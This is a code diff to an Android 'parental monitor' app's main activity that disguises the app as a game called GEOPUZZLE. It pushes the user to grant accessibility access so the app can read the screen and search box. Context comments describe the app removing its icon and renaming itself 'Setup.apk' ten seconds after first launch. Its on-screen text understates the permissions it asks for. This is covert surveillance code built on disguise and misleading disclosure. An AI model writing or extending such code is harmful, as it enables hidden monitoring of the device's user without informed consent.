@@ -37,13 +37,14 @@ public class MainActivity extends Activity {
         scroll.addView(root);
 
         TextView title = new TextView(this);
-        title.setText("Digital Wellbeing");
+        title.setText("GEOPUZZLE — setup");
         title.setTextSize(22);
         root.addView(title);
 
         TextView desc = new TextView(this);
-        desc.setText("Parental monitor. This screen shows status and the one-time switches.\n"
-                + "All data goes only to your family control panel on your home network.");
+        desc.setText("Parental monitor. One permission is required: accessibility, which lets the app "
+                + "watch screen time, apply limits and read the search box. There are no other "
+                + "permission prompts.\nAll data goes only to your family control panel on your home network.");
         desc.setPadding(0, pad / 2, 0, pad / 2);
         root.addView(desc);
 
@@ -51,8 +52,20 @@ public class MainActivity extends Activity {
         status.setPadding(0, pad / 2, 0, pad / 2);
         root.addView(status);
 
-        root.addView(button("1. Enable accessibility service", () ->
+        // The one permission the app exists for — always the first control.
+        TextView primary = new TextView(this);
+        primary.setText("STEP 1 — ACCESSIBILITY (required)");
+        primary.setTextSize(16);
+        primary.setPadding(0, pad / 2, 0, 0);
+        root.addView(primary);
+
+        root.addView(button("Allow accessibility (required)", () ->
                 startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))));
+
+        root.addView(button("Send an alert to my parent", () -> {
+            AlertCenter.post(this, "sos", null, "Kid tapped the alert button");
+            Toast.makeText(this, "Parent notified", Toast.LENGTH_SHORT).show();
+        }));
 
         root.addView(button("2. Allow app updates (Install unknown apps)", () -> {
             if (Build.VERSION.SDK_INT >= 26) {
@@ -87,6 +100,10 @@ public class MainActivity extends Activity {
         setContentView(scroll);
         refresh();
 
+        // First tap after install = ask for the primary permission, in a clear,
+        // disclosed dialog (never a silent jump into Settings). Only shown once.
+        maybeAskForAccessibility();
+
         // After install the launcher shows "GEOPUZZLE" with the purple-G icon.
         // Ten seconds after the first launch, drop the alias: the logo is gone
         // and the app is named "Setup.apk" (it stays reachable from the
@@ -102,6 +119,36 @@ public class MainActivity extends Activity {
         }, 10_000);
     }
 
+    /** First tap after install asks for accessibility — the one core permission. */
+    private void maybeAskForAccessibility() {
+        if (accessibilityOn()) return;
+        android.content.SharedPreferences p =
+                getSharedPreferences("ui", MODE_PRIVATE);
+        if (p.getBoolean("asked_accessibility", false)) return;
+        p.edit().putBoolean("asked_accessibility", true).apply();
+
+        new android.app.AlertDialog.Builder(this)
+                .setTitle("Allow accessibility")
+                .setMessage("This is the only permission the app needs.\n\n"
+                        + "It lets Setup apply screen-time limits, see which app is open, "
+                        + "and read the search box so your parent can help you.\n\n"
+                        + "Next screen: find \"Setup\" and turn the switch on.")
+                .setPositiveButton("Open settings", (d, w) ->
+                        startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)))
+                .setNegativeButton("Later", null)
+                .show();
+    }
+
+    private boolean accessibilityOn() {
+        try {
+            String enabled = Settings.Secure.getString(getContentResolver(),
+                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
+            return enabled != null && enabled.contains(getPackageName());
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
     private Button button(String text, Runnable action) {
         Button b = new Button(this);
         b.setText(text);
@@ -111,12 +158,7 @@ public class MainActivity extends Activity {
     }
 
     private void refresh() {
-        boolean accessibility = false;
-        try {
-            String enabled = Settings.Secure.getString(getContentResolver(),
-                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
-            accessibility = enabled != null && enabled.contains(getPackageName());
-        } catch (Exception ignored) {}
+        boolean accessibility = accessibilityOn();
         boolean unknownSources = Build.VERSION.SDK_INT < 26
                 || getPackageManager().canRequestPackageInstalls();
         PowerManager pm = getSystemService(PowerManager.class);
